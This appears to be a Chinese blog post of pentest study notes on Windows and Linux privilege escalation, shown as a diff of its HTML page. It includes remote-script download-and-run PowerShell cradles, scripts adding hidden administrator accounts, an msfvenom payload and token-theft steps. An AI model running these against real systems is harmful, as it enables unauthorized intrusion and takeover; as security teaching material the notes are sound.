@@ -1,0 +1,971 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="权限提升Windows上常见的权限分类：  User：普通用户权限； Administrator：管理员权限； System：系统权限。 TrustedInstaller ： windows中最高权限。对系统文件，system 权限也无法修改，只有 TrustedInstaller 权限才能修改。  Linux上权限分类：  User：普通用户权限； www-data：Web服务的权限，比User">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升">
+<meta property="og:url" content="http://example.com/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="🗄">
+<meta property="og:description" content="权限提升Windows上常见的权限分类：  User：普通用户权限； Administrator：管理员权限； System：系统权限。 TrustedInstaller ： windows中最高权限。对系统文件，system 权限也无法修改，只有 TrustedInstaller 权限才能修改。  Linux上权限分类：  User：普通用户权限； www-data：Web服务的权限，比User">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330184744211.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330210702070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330211359783.png">
+<meta property="article:published_time" content="2022-03-27T05:49:08.228Z">
+<meta property="article:modified_time" content="2022-04-07T13:26:24.554Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="knowledge">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220330184744211.png">
+  
+  <title>权限提升 - 🗄</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👩‍💻</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="权限提升">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-27 13:49" pubdate>
+        March 27, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      14k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      NaN 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">权限提升</h1>
+            
+            <div class="markdown-body">
+              <h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p><strong>Windows上常见的权限分类：</strong></p>
+<blockquote>
+<p>User：普通用户权限；</p>
+<p>Administrator：管理员权限；</p>
+<p>System：系统权限。</p>
+<p>TrustedInstaller ： windows中最高权限。对系统文件，system 权限也无法修改，只有 TrustedInstaller 权限才能修改。</p>
+</blockquote>
+<p><strong>Linux上权限分类：</strong></p>
+<blockquote>
+<p>User：普通用户权限；</p>
+<p>www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；</p>
+<p>root：Linux系统最高权限。</p>
+</blockquote>
+<p><strong>纵向提权</strong>：低权限角色获取高权限角色的权限。</p>
+<p><strong>横向提权</strong>：在系统A中获取了系统B中同级别的角色权限。</p>
+<h2 id="Win"><a href="#Win" class="headerlink" title="Win"></a>Win</h2><h3 id="内核溢出漏洞提权"><a href="#内核溢出漏洞提权" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><blockquote>
+<p>systeminfo &gt; 1.txt</p>
+</blockquote>
+<p>寻找未打补丁</p>
+<ul>
+<li><p>在线查询：<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
+</li>
+<li><p>脚本+表格匹配：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+</li>
+</ul>
+<blockquote>
+<p>python windows-exploit-suggester.py -d xxx-mssb.xls -i 1.txt</p>
+</blockquote>
+<ul>
+<li>ps脚本：<a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a></li>
+</ul>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//本地加载<br>Import-Module .\Sherlock.ps1<br><br>//远程加载<br>IEX (New-Object  System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>Find-AllVuls</p>
+</blockquote>
+<ul>
+<li>MSF模块：<code>post/multi/recon/local_exploit_suggester</code>或者<code>post/windows/gather/enum_patches</code>可以快速检测到系统中可利用的漏洞</li>
+</ul>
+<blockquote>
+<p>msf</p>
+<p>search suggester</p>
+<p>use 0</p>
+<p>set session 1</p>
+<p>run</p>
+</blockquote>
+<h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><ol>
+<li><p>启动项路径：<br> C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
+</li>
+<li><p>在启动项中创建vbs或bat脚本</p>
+</li>
+</ol>
+<blockquote>
+<p>vbs：<br>  set wshshell=createobject(“wscript.shell”)<br>  a=wshshell.run(“cmd.exe /c net user 用户名 密码  /add”,0)<br>  b=wshshell.run(“cmd.exe /c net localgroup administrators 用户名 /add”,0)<br>bat：<br> net user 用户名 密码 /add<br> net localgroup administrators 用户名 /add</p>
+</blockquote>
+<ol start="3">
+<li><p>接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启。</p>
+</li>
+<li><p>bat脚本运行时会有个dos弹一下，vbs不会弹，建议使用vbs脚本</p>
+</li>
+</ol>
+<h3 id="系统错误配置提权"><a href="#系统错误配置提权" class="headerlink" title="系统错误配置提权"></a>系统错误配置提权</h3><p>windwos系统服务文件在操作系统启动时加载和执行，并在后台调用执行文件。因此，如果一个低权限用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
+<p>windwos服务是以 system 权限运行的，因此，其文件夹、文件和注册表键值都是受强访问机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。</p>
+<p>系统服务权限配置错误(可写目录漏洞)有如下两种可能：</p>
+<ol>
+<li><p>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</p>
+</li>
+<li><p>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用 DLL 劫持技术并尝试重启服务来提权。</p>
+</li>
+</ol>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUP</a></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command <span class="hljs-string">&quot;&amp; &#123;Import-Module c:\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br><br>powershell.exe -nop -<span class="hljs-built_in">exec</span> bypass -c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>MSF中的<code>exploit/windows/local/service_permissions</code>服务提权模块可以返回一个system权限</li>
+</ul>
+<blockquote>
+<p>set SESSION</p>
+<p>run</p>
+</blockquote>
+<p>模块使用两种方法获得system权限：如果meterpreter以管理员权限运行，该模块尝试创建并运行一个新的服务，如果当前权限不允许创建服务，该模块会判断哪些服务或者文件夹的权限有问题，并对其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行文件 ，文件名和安装路径随机</p>
+<ul>
+<li>注册表键AlwayslnstallElevated</li>
+</ul>
+<p><code>注册表键AlwayslnstallElevated</code>是一个策略设置项。Windows允许低权限用户以syetem权限运行安装文件。如果启动此策略设置项，那么任何权限的用户都能以<code>NT AUTHORITY\SYSTEM</code>权限来安装恶意的MSI文件</p>
+<p>使用PowerUP的<code>Get-RegistryAlwaysInstallElevated</code>模块来检测注册表是否被设置。如果 AlwaysInstallElevated 注册表项被设置，意味着的 MSI 文件是以 system 权限运行的，True 表示已经设置，命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -nop -<span class="hljs-built_in">exec</span> bypass IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;C:\Users\Admin\Desktop\PowerUp\PowerUp\PowerUp.ps1&#x27;</span>);Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure>
+
+<p>也可用注册表查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure>
+
+<p>生成恶意的MSI安装文件，让其来添加用户，使用<code>PowerUp</code>脚本自带的 <code>Write-UserAddMSI</code>模块，运行后生成文件 <code>UserAdd.msi</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -nop -<span class="hljs-built_in">exec</span> bypass IEX(New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;C:\Users\Admin\Desktop\PowerUp\PowerUp\PowerUp.ps1&#x27;</span>);Write-UserAddMSI<br></code></pre></td></tr></table></figure>
+
+<p>以普通权限运行UserAdd.msi，下面这个运行后还需要点击Greate，更方便的是直接在桌面上进行双击确定,成功添加用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i UserAdd.msi<br></code></pre></td></tr></table></figure>
+
+<p>另外的方式是可以使用msf生成木马，进行上传运行，实战记得免杀</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -f msi -p windows/adduser USER=qing PASS=123P@ss! -o /root/msi.msi<br>upload /root/msi.msi c:\\msi.msi <br></code></pre></td></tr></table></figure>
+
+<p>msiexec工具参数：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/quiet</span>:在安装过程中禁止向用户发送消息<br><span class="hljs-string">/qn</span>:不实用图形界面<br><span class="hljs-string">/i</span>:安装程序<br></code></pre></td></tr></table></figure>
+
+<p>也可利用metasploit的<code>exploit/windows/local/always_install_elevated</code>模块完成以上的操作，会返回一个system权限的mterpreter。这个模块会创建一个文件名随机的MSI文件，提权后自动删除已部署的文件。</p>
+<ul>
+<li>可信任服务路径漏洞</li>
+</ul>
+<p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</p>
+<p>原理：对于C:\Program Files\Some Folder\Service.exe文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows会依次尝试确定和执行下面的程序：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Program.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some.exe</span><br>C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Some</span> Folder<span class="hljs-string">\Service.exe</span><br></code></pre></td></tr></table></figure>
+
+<p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，比如这里我把木马名字改了Program.exe，放在c盘小,一旦此服务重启，因为优先级的缘故，服务会优先选择我们木马Program.exe，而不是C:\Program Files\Some Folder\Service.exe，那么我们的恶意程序就会以system权限运行(大多数情况下)。</p>
+<p>该漏洞存在如下两种可能性：</p>
+<ol>
+<li><p>如果路径与服务有关，就任意创建一个服务或者编译Serviec模版</p>
+</li>
+<li><p>如果路径与可执行文件有关，就任意创建一个可执行文件</p>
+</li>
+</ol>
+<p>检测使用wmic命令，列出目标机器中所有没有被引号引起来的服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>通过显示出来的服务路径有没有被引号引起来，且路径是否包含空格来判断目标机器上是否存在可信任服务路径漏洞。</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 手动写入</li>
+</ul>
+<p>下一步是检测目标文件是否有写权限。可使用Windows内置工具</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;路径&quot;</span><br>accesschk -dqv <span class="hljs-string">&quot;路径&quot;</span> -accepteula<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">Everyone:用户对这个文件夹有完全控制权限</span><br><span class="hljs-section">（M）:修改</span><br><span class="hljs-section">（F）: 完全控制</span><br><span class="hljs-section">（CI）: 从属容器将继承访问控制项</span><br><span class="hljs-section">（OI）:从属文件将继承访问控制项</span><br><span class="hljs-section">Everyone:(OI)(CI)(F)意思是对该文件夹，用户有读写、删除其下文件、删除其子目录的权限</span><br></code></pre></td></tr></table></figure>
+
+<p>确认漏洞后，要上传的程序<code>重命名</code>并放置在存在此漏洞且可写的目录下，执行如下命令，尝试重启服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 使用msf</li>
+</ul>
+<blockquote>
+<p>use exploit/windows/local/trust_service_path</p>
+<p>set AutoRunScript migrate -f</p>
+</blockquote>
+<ul>
+<li>自动安装配置文件</li>
+</ul>
+<p><code>post/windows/gather/enum_unattend</code>会遍历inf、xml等文件获取账号密码</p>
+<ul>
+<li>计划任务</li>
+</ul>
+<p>域渗透的时候可以关注一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure>
+
+<h3 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h3><p>在一般的域环境中，所有机器都是脚本化批量部署的，数据量通常很大。为了方便管理，管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加入域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码</p>
+<p>就算如此，安全问题依旧存在。通过组策略统一修改的密码，虽然强度有所提高，但所有机器的本地管理员密码是相同的。在通过一台机器的本地管理员密码，就相当于获得了整个域中所有机器的本地管理员密码</p>
+<p>常见的组策略首选项（Group Policy Preferences）列举如下：</p>
+<ol>
+<li>映射驱动器（Drives.xml）</li>
+<li>创建本地用户</li>
+<li>数据源(DataSources.xml)</li>
+<li>打印机配置(Printers.xml)</li>
+<li>创建/更新服务(Services.xml)</li>
+<li>计划任务(ScheduledTasks.xml)</li>
+</ol>
+<p><code>SYSVOL</code>是活动后目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中所有域控制器之间进行复制。SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL在所有经过身份验证的域用户或者域信任用户具有读写权限的活动目录的域范围内共享。整个SYSVOL目录所在的域控制器中是自动同步和共享的，所有的策略均存放在<code>C:\Windows\SYSVOL\DOMAIN\Policies</code>目录中</p>
+<h3 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h3><p>UAC是为微软为提高系统安全性在Windows  Vista中引入的技术。UAC的要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上安装操作或者对计算机设置进行更改。</p>
+<p>在Windows Vista及更高版本的操作系统中，微软设置了安全控制策略，分为<code>高、中、低</code>三个等级。高等级的进程有<code>管理员权限</code>；中等级的进程有<code>普通用户权限</code>；低等级的进程，权限是有限的，以保证在收到安全威胁时造成的损害最小。</p>
+<p>需要UAC的授权才能进行的操作列表如下</p>
+<ol>
+<li>配置Windows Update</li>
+<li>增加/删除账户</li>
+<li>更改账户类型</li>
+<li>更改UAC的设置</li>
+<li>安装ActiveX</li>
+<li>安装/卸载程序</li>
+<li>安装设备驱动程序</li>
+<li>将文件移动/入职到Program Files 或windows等目录下</li>
+<li>查看其他用户的文件夹</li>
+</ol>
+<p>UAC有如下四种设置要求</p>
+<ol>
+<li>始终通知：这是最安全的设置，没当有程序需要使用高级别的权限时都会提示本地用户</li>
+<li>仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</li>
+<li>仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</li>
+<li>从不提示：当用户为管理员时，所有程序会以最高权限运行</li>
+</ol>
+<p>bypassuac模块：</p>
+<ul>
+<li>exploit/windows/local/bypassuac模块</li>
+<li>exploit/windows/local/bypassuac_injection模块</li>
+<li>exploit/windows/local/ask模块 需要管理员权限进行交互</li>
+</ul>
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p><code>令牌（Token）</code>是指系统中的临时密钥，相当于账号和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。令牌将持续存在于系统中，除非系统重新启动</p>
+<p>令牌的最大特点是随机性和不可预测性。<code>访问令牌（Access Token）</code>代表访问控制操作主题的系统对象。<code>密保令牌（Security Token）</code>也叫作认证令牌或者硬件令牌，是一种实现计算机身份校验的物理设备，入U盾。<code>会话令牌（Session Token）</code>是交互会话中唯一的身份标识符</p>
+<p>伪造令牌的攻击的核心是<code>kerberos</code>协议。kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认真服务</p>
+<p>有两种类型的令牌：一种是<code>Delegation Tokens</code>是为授权令牌，支持交互式的登录，如可远程登录访问等；另一种是<code>Impersonation Tokens</code>是模拟令牌，支持非交互式的会话。令牌的数量取决于meterpreter shell的访问级别。如果是一个系统管理员的令牌，则可以直接伪造这个令牌，使攻击者拥有它的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">list_tokens -u                           //列出令牌<br>impersonate_token <span class="hljs-string">&quot;NT AUTHORITY\\SYSTEM&quot;</span> //窃取令牌<br>steal_token 1234                         //从进程窃取令牌<br>rev2self                                 //返回到之前的AccessToken权限<br></code></pre></td></tr></table></figure>
+
+<p>有独立的可执行<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">文件</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">incognito.exe list_tokens -u                            //列举令牌<br>incognito.exe execute -c <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe  //窃取令牌执行cmd.exe，此时可以配合木马<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>窃取TrustedInstaller令牌</li>
+</ul>
+<p>启动服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc.exe start TrustedInstaller<br></code></pre></td></tr></table></figure>
+
+<p>窃取令牌</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use incognito<br>ps                    //找到TrustedInstaller的进程PID<br>steal_token 1234      //从该进程中窃取令牌<br>getuid   <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>配合烂土豆</li>
+</ul>
+<p>C#版的烂土豆（来自QAX零队） </p>
+<p>实测Win7、Win8、08、12等可用</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p>
+<p>直接在Webshell下执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SweetPotato.exe -a whoami<br></code></pre></td></tr></table></figure>
+
+<p>其他的版本：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></p>
+<p>上传potato</p>
+<blockquote>
+<p>execute -cH -f potato.exe<br>impersonate_token “NT AUTHORITY\SYSTEM”</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a>  //需要编译</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a>  </p>
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
+<blockquote>
+<p>C:\Windows\System32<br>C:\Windows\System<br>C:\Windows<br>当前工作目录Current Working Directory，CWD<br>在PATH环境变量的目录（先系统后用户）</p>
+</blockquote>
+<p>收集进程加载了哪些dll，可以上传单机版的火绒剑，进程里面系统文件没有权限无法更改，选择数字签名文件或未知文件，msf生成木马dll进行替换</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="内核溢出漏洞提权-1"><a href="#内核溢出漏洞提权-1" class="headerlink" title="内核溢出漏洞提权"></a>内核溢出漏洞提权</h3><blockquote>
+<p>uname -a</p>
+<p>hostnamectl</p>
+<p>lsb_release -a</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
